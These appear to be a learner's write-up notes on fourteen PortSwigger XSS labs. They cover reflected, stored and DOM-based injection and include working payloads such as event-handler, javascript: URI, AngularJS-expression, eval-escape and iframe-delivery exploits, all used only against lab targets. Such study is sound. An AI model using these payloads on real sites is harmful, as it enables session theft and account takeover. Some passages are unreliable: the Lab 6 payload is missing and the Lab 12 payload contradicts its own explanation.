# Cross-Site Scripting (XSS) — PortSwigger Web Security Academy

Tracking hands-on labs completed for the XSS topic, following the same
methodology used for SQL Injection: understanding the vulnerability,
constructing the payload, and documenting the underlying technique.

---

## Lab 1: Reflected XSS into HTML Context with Nothing Encoded

Topic: Cross-Site Scripting | Difficulty: Apprentice

## Vulnerability
The search functionality takes user input (the search term) and reflects
it directly back into the HTML of the response page — without encoding or
sanitizing any special characters. This means any HTML or JavaScript
submitted in the search box gets rendered and executed directly by the
browser, exactly as if it were part of the page's original code.

## What is Reflected XSS?
Reflected XSS occurs when user-supplied input is immediately echoed back
in the server's response, without being stored anywhere. The malicious
script only executes when a specific crafted request/link is used — unlike
Stored XSS, where the payload is saved on the server and affects every user
who later views the page.

## Steps Taken
1. Entered the following payload into the search box:
<script>alert(1)</script>
2. Clicked "Search"

## How the Payload Works
Since the application inserts the search term directly into the HTML
response without encoding characters like `<` and `>`, the browser
interprets `<script>alert(1)</script>` as literal HTML/JavaScript rather
than plain text. This causes the browser to execute the enclosed
JavaScript (`alert(1)`), popping up an alert box — proving that arbitrary
JavaScript can be injected and executed in the context of the page.

## Result
Successfully triggered the `alert(1)` popup, confirming the reflected XSS
vulnerability and solving the lab.

## What I Learned
This lab demonstrated the most fundamental form of XSS: when input is
reflected into an HTML context with zero encoding, injecting a `<script>`
tag directly is often all that's needed. In a real attack, this same
technique could be used to steal cookies/session tokens, redirect users to
malicious sites, or perform actions on behalf of the victim — the `alert()`
call here is simply a safe, standard proof-of-concept used to demonstrate
that arbitrary script execution is possible. This connects conceptually to
the SQL injection labs: in both cases, the root cause is the same pattern —
user input being trusted and inserted directly into a context (SQL query
or HTML page) without proper sanitization or encoding.



## Lab 2: Stored XSS into HTML Context with Nothing Encoded

Topic: Cross-Site Scripting | Difficulty: Apprentice

## Vulnerability
The blog's comment functionality accepts user input (comment text) and
stores it directly, then renders it back — unencoded — every time the blog
post page is loaded. Unlike Lab 1's search feature (which only reflected
the payload back once, immediately), this comment is permanently saved on
the server and displayed to anyone who later visits that blog post.

## What Makes This "Stored" (vs. Reflected)
- **Reflected XSS (Lab 1):** payload only executes for the specific request
  containing it — an attacker typically needs to trick a victim into
  clicking a specially crafted link
- **Stored XSS (this lab):** payload is saved in the application's data
  (e.g. a database), and executes automatically for *every* user who
  simply views the affected page — no special link or trick needed, making
  it generally more dangerous since it can silently affect many victims

## Steps Taken
1. Filled in the comment form's Name, Email, and Website fields
2. Entered the following payload into the Comment box:
<script>alert(1)</script>
3. Clicked "Post comment"
4. Navigated back to the blog post page

## How the Payload Works
Same underlying mechanism as Lab 1 — the comment text is inserted into the
page's HTML without encoding special characters. Because the comment is
now permanently stored and re-rendered on every page load, the
`<script>alert(1)</script>` payload executes automatically each time the
blog post is viewed, not just once.

## Result
Successfully triggered the `alert(1)` popup upon revisiting the blog post,
confirming the stored XSS vulnerability and solving the lab.

## What I Learned
This lab reinforced the distinction between reflected and stored XSS —
while the injection technique itself was identical to Lab 1, the *impact*
is significantly higher here because the malicious script persists and
runs for every visitor automatically, without requiring the attacker to
send a crafted link to a specific victim. In a real-world scenario, a
stored XSS payload in a public comment section could silently compromise
every user who views that page — for example, stealing session cookies
from many victims simultaneously, rather than just one targeted individual.
This is why stored XSS is generally treated as more severe than reflected
XSS in vulnerability assessments.


## Lab 3: DOM XSS in document.write Sink Using Source location.search

Topic: Cross-Site Scripting (DOM-based) | Difficulty: Apprentice

## Vulnerability
This lab's search tracking functionality uses client-side JavaScript to
take data directly from the URL (`location.search`, the query string
portion of the URL) and pass it into `document.write()`, which writes
content directly into the page's HTML. Since this happens entirely in the
browser via JavaScript — with no server involvement in processing that
specific data — this is a DOM-based vulnerability rather than a
server-side one.

## What Makes This Different from Labs 1 & 2 (Reflected/Stored)
- **Reflected/Stored XSS (Labs 1–2):** the server itself inserts
  unsanitized user input into the HTML response
- **DOM-based XSS (this lab):** the server's HTML response is safe as
  delivered — the vulnerability exists entirely in client-side JavaScript,
  which reads attacker-controllable data (a "source") and writes it
  somewhere dangerous (a "sink") without sanitization

## Source and Sink Concept
- **Source** = where attacker-controllable data enters the JavaScript
  (here, `location.search` — the query string of the URL, fully
  controllable by crafting a malicious link)
- **Sink** = where that data ends up being used dangerously (here,
  `document.write()`, which writes raw content directly into the page's HTML)

## Steps Taken

### Step 1: Probe how input is reflected
Entered a random alphanumeric test string into the search box, then
right-clicked the resulting page and used "Inspect Element" to examine
where that string landed in the actual HTML.

### Step 2: Identify the injection context
Found that the test string had been placed inside an `img` tag's `src`
attribute (e.g. `<img src="[my test string]">`) — meaning a simple
`<script>` tag (like in Labs 1–2) would not work here directly, since the
injection point sits inside an existing HTML attribute, not in a place
where a new tag can just be opened freely.

### Step 3: Break out of the attribute and inject a new element
Used the following payload in the search box:
"><svg onload=alert(1)>

## How the Payload Works
- `"` closes the `img` tag's `src` attribute value
- `>` closes the `img` tag itself, ending it early
- `<svg onload=alert(1)>` injects a brand new HTML element (an SVG image
  tag) that includes an `onload` event handler — this handler
  automatically fires the moment the browser finishes loading the SVG
  element, executing `alert(1)` without needing a `<script>` tag at all

This technique is necessary specifically because the injection point was
inside an attribute value, not free-standing HTML — the attacker first has
to "escape" out of that attribute/tag context before injecting anything new.

## Result
Successfully broke out of the `img` attribute context and triggered
`alert(1)` using an SVG element with an `onload` event handler, solving
the lab.

## What I Learned
This lab introduced two important concepts beyond the basic `<script>`
injection from Labs 1–2: first, the source/sink model for understanding
DOM-based XSS (data flows from an attacker-controllable source through
JavaScript into a dangerous sink, entirely client-side); and second, that
successful XSS often requires first identifying the exact HTML context
the payload lands in (an attribute vs. free text) before choosing the
right technique to escape that context. Event handlers like `onload` are
a critical alternative to `<script>` tags — this becomes especially
important in later labs where `<script>` tags or certain characters are
likely to be filtered or blocked.


## Lab 4: DOM XSS in innerHTML Sink Using Source location.search
Completed: [aaj ki date]
Topic: Cross-Site Scripting (DOM-based) | Difficulty: Apprentice

## Vulnerability
The search blog functionality reads the search term from `location.search`
(the URL's query string) and assigns it directly to a `div` element's
`innerHTML` property. This changes the actual HTML content inside that div,
using attacker-controllable data, without any sanitization.

## Source and Sink (this lab)
- **Source:** `location.search` — same as Lab 3
- **Sink:** `innerHTML` assignment — different from Lab 3's `document.write`

## Important Difference from document.write
A key detail with `innerHTML`: it does **not** execute `<script>` tags
even if injected directly — browsers deliberately block script execution
via innerHTML assignment as a partial safety measure. This is why a plain
`<script>alert(1)</script>` payload would silently fail here, unlike in
Labs 1–2. Instead, the payload needs to rely on an HTML element whose
event handler fires automatically, since event handlers *do* still execute
even when the surrounding HTML is inserted via innerHTML.

## Steps Taken
1. Entered the following payload directly into the search box:
<img src=1 onerror=alert(1)>
```
2. Clicked "Search"
How the Payload Works

<img src=1 ...> creates an image tag with an intentionally invalid
src value (1 is not a real image path)
Since the browser cannot load a valid image from that broken source, it
fires the onerror event handler automatically
onerror=alert(1) means the moment that error event fires, alert(1)
executes

This works specifically because the payload doesn't rely on a <script>
tag at all — it uses a naturally-occurring browser event (a failed image
load) to trigger JavaScript execution, sidestepping innerHTML's
script-blocking behavior entirely.
Result
Successfully triggered alert(1) via the img tag's onerror handler,
solving the lab.
What I Learned
This lab reinforced why event-handler-based payloads (like onerror,
onload from Lab 3) are often more reliable than <script> tags in
DOM-based XSS — many DOM sinks (like innerHTML) specifically block script
execution as a built-in browser protection, but this protection doesn't
extend to event handlers on other HTML elements. This means understanding
which sink is being used matters directly for choosing a working
payload: document.write generally allows script tags to execute, while
innerHTML does not, requiring an event-handler-based workaround instead.



## Lab 5: DOM XSS in jQuery Anchor href Attribute Sink Using location.search Source

Topic: Cross-Site Scripting (DOM-based) | Difficulty: Apprentice

## Vulnerability
The Submit Feedback page uses jQuery's `$` selector to find an anchor
(`<a>`) element — the "back" link — and sets its `href` attribute using a
value taken from the `returnPath` query parameter in the URL. Since this
value is inserted directly into the `href` attribute without validation,
an attacker can control where that link actually points.

## Source and Sink (this lab)
- **Source:** `location.search` (specifically the `returnPath` parameter)
- **Sink:** jQuery-set `href` attribute on an anchor element

## Steps Taken

### Step 1: Probe how input is reflected
Changed the `returnPath` query parameter to a random alphanumeric string,
then inspected the page's HTML to see where that value landed — confirmed
it was placed directly inside the anchor tag's `href` attribute.

### Step 2: Inject a javascript: URI payload
Changed `returnPath` to:
javascript:alert(document.cookie)
Pressed enter to reload the page with the new query parameter, then
clicked the "back" link.

## How the Payload Works
Unlike previous labs (which broke out of an HTML attribute using quotes
and angle brackets, or used event handlers), this technique exploits the
fact that an `href` attribute can accept a `javascript:` URI scheme
instead of a normal URL. When a link with `href="javascript:..."` is
clicked, the browser executes the code following `javascript:` as
JavaScript, instead of navigating to a page. Since the `href` value was
attacker-controlled via the `returnPath` parameter, and no validation
restricted it to normal URLs, this allowed direct JavaScript execution
simply by clicking the link.

`document.cookie` specifically returns the cookies associated with the
current page — a common real-world target for XSS attacks, since session
cookies can often be stolen this way to hijack a logged-in user's session.

## Result
Successfully triggered `alert(document.cookie)` by clicking the modified
"back" link, solving the lab.

## What I Learned
This lab introduced a new XSS delivery mechanism: the `javascript:` URI
scheme, which doesn't require injecting any new HTML tags or breaking out
of an existing attribute using quotes/angle brackets — instead, it directly
replaces the entire attribute value with executable JavaScript. This is
only exploitable because the sink is specifically an attribute that
browsers treat as "clickable/navigable" (like `href`), which accepts
`javascript:` as a valid scheme. It also introduced `document.cookie` as a
realistic attack target — in a genuine attack, this technique could be
combined with a way to exfiltrate the cookie value to an attacker-controlled
server (rather than just displaying it via alert), which is exactly how
real session hijacking via XSS often works.


## Lab 6: DOM XSS in jQuery Selector Sink Using a hashchange Event

Topic: Cross-Site Scripting (DOM-based) | Difficulty: Practitioner

## Vulnerability
The home page uses jQuery's `$()` selector function to automatically
scroll to a blog post whose title is taken from `location.hash` (the part
of a URL after the `#` symbol). This selector is re-evaluated every time
the URL hash changes — including when it's changed dynamically via
JavaScript — without sanitizing the hash value first.

## Source and Sink (this lab)
- **Source:** `location.hash`, specifically triggered via a `hashchange`
  event (fires whenever the URL's hash portion changes)
- **Sink:** jQuery `$()` selector — when passed a malicious string instead
  of a simple ID/class selector, jQuery can interpret and execute injected
  HTML

## What's New in This Lab: Exploit Delivery
Unlike Labs 1–5 (where I directly typed a payload into a search box or URL
and tested it myself), this lab required actually **delivering** a working
exploit to a separate victim user — closely mirroring how a real attack
would work, where the attacker crafts a malicious page and lures a victim
into visiting it, rather than the attacker exploiting their own browser.

## Steps Taken

### Step 1: Identify the vulnerable sink
Used browser DevTools to inspect the home page's JavaScript and confirmed
it uses jQuery's `$()` selector with a value derived from `location.hash`,
triggered on the `hashchange` event.

### Step 2: Build the exploit on the provided exploit server
Opened the lab's exploit server (a separate hosted page used to simulate
an attacker-controlled site) and added the following payload to the page body:
```html

```

### Step 3: Test the exploit against my own browser
Clicked "View exploit" to confirm the payload correctly triggered the
browser's `print()` dialog.

### Step 4: Deliver the exploit to the victim
Clicked "Deliver to victim" — the lab's simulated victim then visited the
malicious exploit page, triggering the same payload in their browser
session and solving the lab.

## How the Payload Works
- The `iframe` loads the target site's home page, appending just `#` to
  the URL initially (a valid but harmless hash)
- The `onload` event handler fires once the iframe finishes loading, and
  appends new content to the iframe's `src` — specifically adding
  `<img src=x onerror=print()>` to the URL's hash portion
- Changing the iframe's `src` in this way triggers a `hashchange` event
  on the framed page, causing the vulnerable jQuery selector to process
  this new, malicious hash value
- Since the hash now contains `<img src=x onerror=print()>`, jQuery's
  selector interprets it as HTML rather than a plain ID selector, and the
  image's broken `src` fires the `onerror` handler, calling `print()`

## Result
Successfully delivered a working exploit to a separate victim browser
session, triggering `print()` and solving the lab.

## What I Learned
This lab was a meaningful step toward realistic attack simulation —
instead of exploiting my own request, I had to construct a self-contained
malicious page (hosted separately, as an attacker's site would be) that
automatically triggers the vulnerability in a victim's browser the moment
they visit it, with no interaction required from the victim beyond loading
the page. This also introduced `location.hash` as a distinct source from
`location.search` — the hash portion of a URL is never sent to the server
at all, meaning this class of vulnerability is purely client-side from
start to finish, and traditional server-side logging/monitoring would
never even see the malicious hash value in a request log. Combining an
iframe with a dynamically modified `src` attribute is also a reusable
technique for triggering hash-based DOM XSS in an automated exploit,
rather than relying on a victim manually clicking a crafted link.



## Lab 7: Reflected XSS into Attribute with Angle Brackets HTML-Encoded

Topic: Cross-Site Scripting (Reflected) | Difficulty: Apprentice

## Vulnerability
The search blog functionality reflects the search term back into an HTML
attribute value. Unlike earlier reflected XSS labs, this application
specifically HTML-encodes angle brackets (`<` and `>`) — meaning a
straightforward `<script>` or `<img>` tag injection would fail here, since
those characters get converted to harmless entities (`&lt;`, `&gt;`)
before being rendered. However, quotation marks were **not** encoded,
leaving a different path open for exploitation.

## Steps Taken

### Step 1: Probe how input is reflected
Submitted a random alphanumeric string into the search box, then used
Burp Suite to intercept the resulting request and sent it to Burp Repeater
for easier testing. Confirmed the string was reflected inside a
double-quoted HTML attribute value.

### Step 2: Escape the attribute using an unencoded quote
Replaced the input with:
"onmouseover="alert(1)

### Step 3: Verify the exploit
Copied the resulting URL (with the payload as the search parameter) and
opened it directly in the browser. Hovering the mouse over the affected
element triggered the `alert(1)` popup.

## How the Payload Works
- The leading `"` closes the original attribute's quoted value early
- `onmouseover="alert(1)` then injects a brand new attribute — the
  `onmouseover` event handler — directly onto the same HTML element
- Since angle brackets were encoded but quotation marks were not, this
  attack never needed to create a new tag at all; it simply added a new
  *attribute* to the existing tag, sidestepping the filter entirely
- The injected `onmouseover` handler fires whenever a user's mouse passes
  over the element, executing `alert(1)` at that point

## Result
Successfully injected a new event-handler attribute and triggered
`alert(1)` on mouseover, solving the lab.

## What I Learned
This lab highlighted an important lesson about partial input filtering:
encoding only `<` and `>` blocks the creation of new HTML tags, but does
nothing to prevent an attacker from injecting new *attributes* onto an
already-existing tag, as long as quote characters remain unencoded. This
reinforces that XSS defenses need to account for every character that
carries special meaning in the relevant context (angle brackets for tags,
quotes for attribute boundaries, etc.) — encoding only some of them still
leaves a viable attack path. It also introduced event-handler-based
injection without any script tag or new element at all, which is a
technique likely to reappear in later labs targeting increasingly
restrictive filters.



## Lab 8: Stored XSS into Anchor href Attribute with Double Quotes HTML-Encoded

Topic: Cross-Site Scripting (Stored) | Difficulty: Apprentice

## Vulnerability
The comment functionality's "Website" field is stored and later used to
set the `href` attribute of an anchor tag around the comment author's
name. Double quotes are HTML-encoded here, meaning the earlier attribute-
escape technique from Lab 7 (`"onmouseover=...`) would not work — breaking
out of the attribute using a quote is blocked. However, since the value
still lands entirely inside the `href` attribute, the `javascript:` URI
scheme (from Lab 5) was usable here instead.

## Steps Taken

### Step 1: Confirm reflection point
Posted a comment with a random alphanumeric string in the "Website" field,
intercepted the request with Burp Suite, and sent it to Repeater.

### Step 2: Confirm where the value lands
Made a second request (viewing the post page) and intercepted it in a
separate Repeater tab, confirming the random string appeared inside an
anchor tag's `href` attribute.

### Step 3: Inject a javascript: URI payload
Replaced the "Website" field value with:
javascript:alert(1)
Submitted the comment, then loaded the post page and clicked the
comment author's name (the linked text).

## How the Payload Works
Since double quotes were encoded, escaping out of the attribute value
(like in Lab 7) wasn't possible — any injected quote would simply render
as literal text (`&quot;`), not break the HTML structure. Instead, this
attack didn't need to escape the attribute at all: it replaced the *entire*
`href` value with a `javascript:` URI, exactly as in Lab 5. When the
comment author's name (the anchor text) is clicked, the browser executes
the JavaScript following `javascript:` instead of navigating to a URL,
triggering `alert(1)`.

## Result
Successfully stored a comment whose author link triggers `alert(1)` when
clicked, solving the lab.

## What I Learned
This lab reinforced that the `javascript:` URI technique (first used in
Lab 5) is broadly useful specifically whenever the injection point is an
entire attribute value that accepts a URL/URI — it doesn't require
breaking out of quotes or injecting new HTML at all, which makes it
resistant to defenses that only encode quotes or angle brackets. Since
this is now stored (unlike Lab 5's reflected version), every visitor who
views the comment and clicks the author's name would trigger the payload,
making it significantly more dangerous in a real-world scenario — a single
malicious comment could compromise many users over time, not just one
targeted victim.



## Lab 9: Reflected XSS into a JavaScript String with Angle Brackets HTML-Encoded

Topic: Cross-Site Scripting (Reflected) | Difficulty: Apprentice

## Vulnerability
The search query tracking functionality reflects the search term directly
inside a JavaScript string literal within a `<script>` block on the page
(e.g. `var searchTerm = 'user-input-here';`). Angle brackets are
HTML-encoded, so injecting a new HTML tag (`<script>`, `<img>`, etc.)
would not work. However, since the reflection point is already inside
existing JavaScript code, the attack doesn't need any HTML tags at all —
it only needs to break out of the JavaScript string itself.

## Steps Taken

### Step 1: Confirm the reflection context
Submitted a random alphanumeric string into the search box, intercepted
the request with Burp Suite, and sent it to Repeater. Confirmed the value
was being reflected directly inside a JavaScript string (between single
quotes) inside a `<script>` tag — not inside regular HTML.

### Step 2: Break out of the JavaScript string
Replaced the input with:
'-alert(1)-'

### Step 3: Verify the exploit
Copied the resulting URL and opened it directly in the browser — loading
the page triggered `alert(1)` automatically.

## How the Payload Works
- The original code looked something like:
  `var searchTerm = 'INJECTION_POINT';`
- The leading `'` closes the original string literal early
- `-alert(1)-` uses the JavaScript subtraction operator (`-`) purely as a
  trick to keep the surrounding code syntactically valid while inserting
  a function call in between — it doesn't matter that subtracting a
  function's return value from a string doesn't make logical sense, since
  `alert(1)` still executes as a side effect before the (irrelevant)
  subtraction result is computed
- The trailing `-'` reopens a string literal to match the original
  trailing `'` in the code, keeping the overall JavaScript syntactically
  valid so no error is thrown and the rest of the script continues to run
  normally

The resulting code effectively becomes:
```javascript
var searchTerm = ''-alert(1)-'';
```
which JavaScript parses as: an empty string, minus the result of
`alert(1)`, minus another empty string — syntactically valid, and
`alert(1)` executes as part of evaluating that expression.

## Result
Successfully broke out of the JavaScript string context and triggered
`alert(1)`, solving the lab without needing any HTML tags or event
handlers.

## What I Learned
This lab introduced a distinct XSS context from every previous lab: HTML
tag encoding is irrelevant when the injection point is already inside a
`<script>` block, because the attack surface here is JavaScript syntax,
not HTML syntax. Breaking out of a JavaScript string requires closing the
quote character being used, then constructing a payload that keeps the
*surrounding* JavaScript syntactically valid (using operators like `-` to
"glue" the malicious code in without causing a parse error), rather than
relying on angle brackets or event handlers at all. This is an important
category to recognize during real-world testing — inspecting exactly
*where* reflected input lands (HTML body, HTML attribute, or JavaScript
string, as seen across Labs 1–9 so far) directly determines which
technique will actually work.



## Lab 10: DOM XSS in document.write Sink Using location.search Inside a select Element

Topic: Cross-Site Scripting (DOM-based) | Difficulty: Practitioner

## Vulnerability
The stock checker functionality on product pages extracts a `storeId`
parameter from `location.search` and uses `document.write()` to insert it
as a new `<option>` inside an existing `<select>` (dropdown) element. This
is the same sink (`document.write`) seen in Lab 3, but this time the
injection point sits inside a `<select>` element's content, which requires
a different escape approach.

## Steps Taken

### Step 1: Confirm the reflection point
Added a `storeId` parameter with a random alphanumeric string to the
product page URL and loaded it. Observed the random string appeared as a
new option inside the stock checker's dropdown list.

### Step 2: Inspect the exact HTML context
Right-clicked and inspected the dropdown element, confirming the
`storeId` value was being placed directly inside the `<select>` element's
option list, as raw HTML content (not inside a tag attribute).

### Step 3: Break out of the select element
Modified the URL to:
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>

## How the Payload Works
- `"></select>` closes the (nonexistent, since we're already inside plain
  content) attribute context defensively, then explicitly closes the
  `<select>` element early, ending the dropdown entirely
- `<img src=1 onerror=alert(1)>` then injects a new element after the now-
  closed select — using the same broken-image/onerror technique from
  Lab 4, since this is a reliable way to trigger JavaScript execution
  without relying on `<script>` tags
- Because the payload explicitly closes the `<select>` tag before
  injecting the `<img>` element, the browser treats the `<img>` tag as a
  regular, independent HTML element outside of the dropdown — allowing it
  to load (and fail to load, triggering `onerror`) normally

## Result
Successfully broke out of the `<select>` element and triggered `alert(1)`
via the img tag's onerror handler, solving the lab.

## What I Learned
This lab extended the `document.write` sink concept from Lab 3 into a more
specific and slightly trickier scenario: the injection point wasn't just
"somewhere in the HTML body," but specifically nested inside a `<select>`
element, which meant simply injecting an `<img>` tag directly (without
first closing the select) might not behave as expected inside a dropdown
context. Explicitly closing the enclosing element (`</select>`) before
injecting new markup is a reusable pattern for breaking out of *any*
container element cleanly, not just attributes (as in earlier labs) —
reinforcing that identifying the exact enclosing HTML structure around
the injection point is just as important as identifying the sink itself.



## Lab 11: DOM XSS in AngularJS Expression with Angle Brackets and Double Quotes HTML-Encoded

Topic: Cross-Site Scripting (DOM-based, Framework-Specific) | Difficulty: Practitioner

## Vulnerability
The search functionality reflects user input inside an HTML element that
has an `ng-app` attribute — a directive that tells AngularJS (a JavaScript
framework) to actively scan and process that element's contents. Both
angle brackets and double quotes are HTML-encoded here, which blocks every
technique used in previous labs (new tags, attribute escapes). However,
because AngularJS itself evaluates any expression written inside double
curly braces (`{{ }}`) as live JavaScript, this creates an entirely
separate injection path that doesn't depend on HTML characters at all.

## Why Previous Techniques Don't Work Here
- New tags (`<script>`, `<img>`) — blocked, angle brackets encoded
- Attribute escape (`"onmouseover=...`) — blocked, double quotes encoded
- Since both primary "escape characters" used throughout Labs 1–10 are
  neutralized, a completely different mechanism was needed: AngularJS's
  own expression evaluation

## Steps Taken

### Step 1: Identify the AngularJS context
Entered a random alphanumeric string into the search box, then viewed the
page source and confirmed the reflected value sits inside an element
carrying the `ng-app` attribute — confirming AngularJS is actively
scanning and evaluating that section of the page.

### Step 2: Inject an AngularJS expression
Entered the following into the search box:
{{$on.constructor('alert(1)')()}}
Clicked "Search"

## How the Payload Works
- Anything inside `{{ }}` within an `ng-app`-scoped element is evaluated
  by AngularJS as a JavaScript-like expression, entirely separate from
  normal HTML parsing — this bypasses the angle-bracket/quote encoding
  completely, since no HTML special characters are needed at all
- `$on` is an accessible property within the AngularJS expression
  evaluation context; calling `.constructor` on it accesses the underlying
  JavaScript `Function` constructor
- `Function('alert(1)')` dynamically creates a new function whose body is
  the string `alert(1)` — effectively a way to turn an arbitrary string
  into executable code
- The trailing `()` immediately invokes that newly created function,
  executing `alert(1)`

## Result
Successfully triggered `alert(1)` by exploiting AngularJS's expression
evaluation feature, completely bypassing both angle-bracket and
double-quote encoding, solving the lab.

## What I Learned
This lab was a significant conceptual jump: it demonstrated that XSS
defenses focused purely on encoding HTML-special characters can be
completely bypassed when a client-side framework (like AngularJS)
introduces its *own* expression language that gets evaluated independently
of standard HTML/JavaScript parsing. This means understanding which
frontend frameworks/libraries are in use on a target application matters
directly for security testing — a framework's own template/expression
syntax can become an entirely separate attack surface that generic input
encoding doesn't protect against at all. This is also a good example of
using a constructor-based technique (`Function` constructor via
`.constructor`) to achieve arbitrary code execution from what looks like a
harmless string, a pattern that shows up in more advanced
sandbox-escape and filter-bypass XSS scenarios.


## Lab 12: Reflected DOM XSS

Topic: Cross-Site Scripting (Reflected DOM) | Difficulty: Practitioner

## Vulnerability
This lab combines both server-side and client-side behavior. The server
takes the search term from the request and echoes it back inside a JSON
response (`search-results`). A separate client-side script
(`searchResults.js`) then takes that JSON response and processes it using
`eval()` — a JavaScript function that executes any string passed to it as
actual code. The server does attempt to escape double-quote characters in
the response, but critically does **not** escape backslash characters,
creating an exploitable gap.

## What is "Reflected DOM" XSS?
This is a hybrid category: the vulnerability starts on the server side
(user input is reflected back in a response, like traditional reflected
XSS), but the actual dangerous execution happens client-side, when
JavaScript unsafely processes that reflected data via a sink like `eval()`.
This differs from Labs 3, 4, 6, and 10 (pure DOM XSS), where the data
never touched the server at all (e.g. `location.hash`, `location.search`
read directly by client-side JS with no server round-trip for that value).

## Steps Taken

### Step 1: Observe the reflection
Enabled Burp Suite's Intercept feature, searched for a test string like
`"XSS"` on the site, and forwarded the request. Observed in the
intercepted response that the search term was reflected inside a JSON
object under a `search-results` response.

### Step 2: Identify the dangerous sink
Opened `searchResults.js` via Burp's Site Map and found that this script
takes the JSON response and passes it directly into an `eval()` call —
meaning the entire JSON response body is executed as JavaScript code, not
just parsed as inert data.

### Step 3: Test the server's escaping behavior
Experimented with different search strings containing special characters
and found that the server escapes double-quote characters (`"` becomes
`\"`) but does **not** escape backslash characters (`\`) themselves.

### Step 4: Exploit the escaping gap
Submitted the following as the search term:
"-alert(1)}//

## How the Payload Works
- The payload begins with a backslash (`\`) followed by a double-quote (`"`)
- Since the server escapes quotes but not backslashes, when the server
  processes this input, it turns the `"` into `\"` — but the backslash I
  already supplied is placed immediately before it, resulting in `\\"`
  in the final response
- A double-backslash (`\\`) in a JSON/JavaScript string is interpreted as
  a single literal backslash character, which means the following quote
  is **no longer escaped** — it now acts as a real, functional
  string-closing quote
- This effectively closes the JSON string early, right where I wanted it to
- `-alert(1)` then uses the subtraction operator (same trick as Lab 9) to
  insert a function call while keeping the surrounding expression
  syntactically parseable by `eval()`
- `}//` closes the JSON object early and comments out anything that would
  have followed, preventing a syntax error from breaking the rest of the
  `eval()` call

The final response body effectively became:
```json
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```
which, once passed through `eval()`, executes `alert(1)` as a side effect
of evaluating the constructed expression.

## Result
Successfully exploited the backslash-escaping gap to break out of the JSON
string inside an `eval()` sink, triggering `alert(1)` and solving the lab.

## What I Learned
This was one of the most intricate labs so far — it required understanding
how escaping works at a character level (specifically, that escaping only
the double-quote character is insufficient if backslash itself isn't also
escaped, since an attacker-supplied backslash can "consume" the server's
defensive escape and neutralize it). It also reinforced why `eval()` is
considered one of the most dangerous possible sinks in JavaScript: passing
untrusted data — even data wrapped in what looks like a safe JSON
structure — into `eval()` means any successful string-escape technique
leads directly to arbitrary code execution. This lab combined multiple
techniques learned earlier (subtraction-operator glueing from Lab 9,
careful analysis of exact escaping behavior) into a single, realistic
attack chain that closely resembles subtle real-world escaping bugs found
in production applications.


## Lab 13: Stored DOM XSS

Topic: Cross-Site Scripting (Stored DOM) | Difficulty: Practitioner

## Vulnerability
The blog comment functionality attempts to prevent XSS by using
JavaScript's `replace()` function to encode angle brackets before storing/
displaying the comment. However, this defense has a critical flaw: when
`replace()` is called with a plain string as its first argument (rather
than a regular expression with the global `/g` flag), it only replaces
the **first occurrence** of that character in the entire string — every
subsequent occurrence is left completely untouched.

## What is "Stored DOM" XSS?
This combines the persistence of stored XSS (Labs 2, 8) with a purely
client-side sink — the comment is saved on the server (like traditional
stored XSS) and later processed unsafely by client-side JavaScript when
rendered, rather than being unsafely inserted directly by server-side code.

## Steps Taken

### Step 1: Understand the flawed filter
Recognized that a `replace()` call without a global flag only affects the
first match. This meant any angle brackets appearing *after* the first
pair in the input would pass through completely unencoded.

### Step 2: Craft a comment that exploits this gap
Posted a comment containing:
<><img src=1 onerror=alert(1)>

## How the Payload Works
- The very first `<` and `>` (forming an empty, meaningless `<>` pair) are
  "sacrificed" — the filter's `replace()` call finds and encodes only this
  first occurrence
- Because `replace()` only processes the first match, the filter considers
  its job "done" after handling this initial pair — even though more angle
  brackets follow
- The real payload, `<img src=1 onerror=alert(1)>`, comes immediately
  after and passes through completely untouched, since the filter never
  looks at it
- The `img` tag itself uses the same broken-image/`onerror` technique from
  Labs 4 and 10 to trigger `alert(1)` without needing a `<script>` tag

## Result
Successfully bypassed the angle-bracket filter by exploiting its
single-replacement limitation, triggering `alert(1)` via the stored
comment, and solving the lab.

## What I Learned
This lab was a strong example of how an XSS defense can be
*conceptually* correct (encoding angle brackets does prevent HTML
injection, in principle) while still being completely broken due to an
implementation detail — here, forgetting that `String.replace()` with a
plain string argument only replaces the first match, not all matches
(which normally requires a regex with the `/g` global flag, or a different
approach entirely). This reinforces a recurring theme across many labs in
this topic (7, 12, and now 13): filter/encoding-based defenses are
fragile and depend entirely on getting every implementation detail
correct, whereas the more robust real-world fix is almost always to use
context-aware output encoding libraries or a Content Security Policy,
rather than hand-rolled string replacement logic.



## Lab 14: Reflected XSS into HTML Context with Most Tags and Attributes Blocked

Topic: Cross-Site Scripting (WAF Bypass) | Difficulty: Practitioner/Expert

## Vulnerability
The search functionality is reflected XSS-vulnerable, but a Web Application
Firewall (WAF) sits in front of it, blocking most common XSS payloads,
tags, and attributes. Solving this required systematically discovering
exactly which tag and which event attribute the WAF does NOT block,
rather than relying on a single known payload.

## Steps Taken

### Step 1: Confirm standard payloads are blocked
Tried a standard payload:
<img src=1 onerror=print()>
````
This was blocked by the WAF, confirming filtering is in place beyond
simple encoding.
Step 2: Systematically fuzz allowed HTML tags using Burp Intruder
Sent a search request to Burp Intruder and set the search term to:
<>
Placed a payload position between the angle brackets (<§§>), then used
PortSwigger's XSS cheat sheet to load a comprehensive list of HTML tags as
the payload set. Ran the attack, testing every tag automatically.
Result: Nearly every tag caused an HTTP 400 (blocked) response,
except body, which returned 200 — confirming the WAF allows the
<body> tag specifically.
Step 3: Systematically fuzz allowed event attributes
Using the confirmed <body> tag, set the search term to:
<body%20=1>
Placed a payload position right before the = sign (<body%20§§=1>),
then loaded the cheat sheet's list of event handler attributes as the
payload set. Ran the attack again.
Result: Most event attributes returned 400, except onresize, which
returned 200 — confirming onresize was the one event handler the WAF
permitted.
Step 4: Construct the working payload
Combined the two discovered allowed elements:
"><body onresize=print()>
This alone triggers print() — but onresize only fires when the
element's containing window/frame is resized, which doesn't happen
naturally on a normal page load. This required a delivery mechanism that
would force a resize event.
Step 5: Build a delivery exploit that triggers the resize event
On the exploit server, created the following payload:
html<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.width='100px'">

The iframe's src loads the vulnerable search page with the
URL-encoded XSS payload already embedded in the search parameter
The iframe's own onload handler fires once it finishes loading, and
immediately changes the iframe's width (this.style.width='100px')
Resizing the iframe in this way triggers a resize event on the framed
page itself, which fires the injected onresize handler, executing
print()

Step 6: Deliver to victim
Stored the exploit and clicked "Deliver exploit to victim," successfully
triggering print() in the victim's simulated browser session.
Result
Successfully identified the one tag (body) and one event attribute
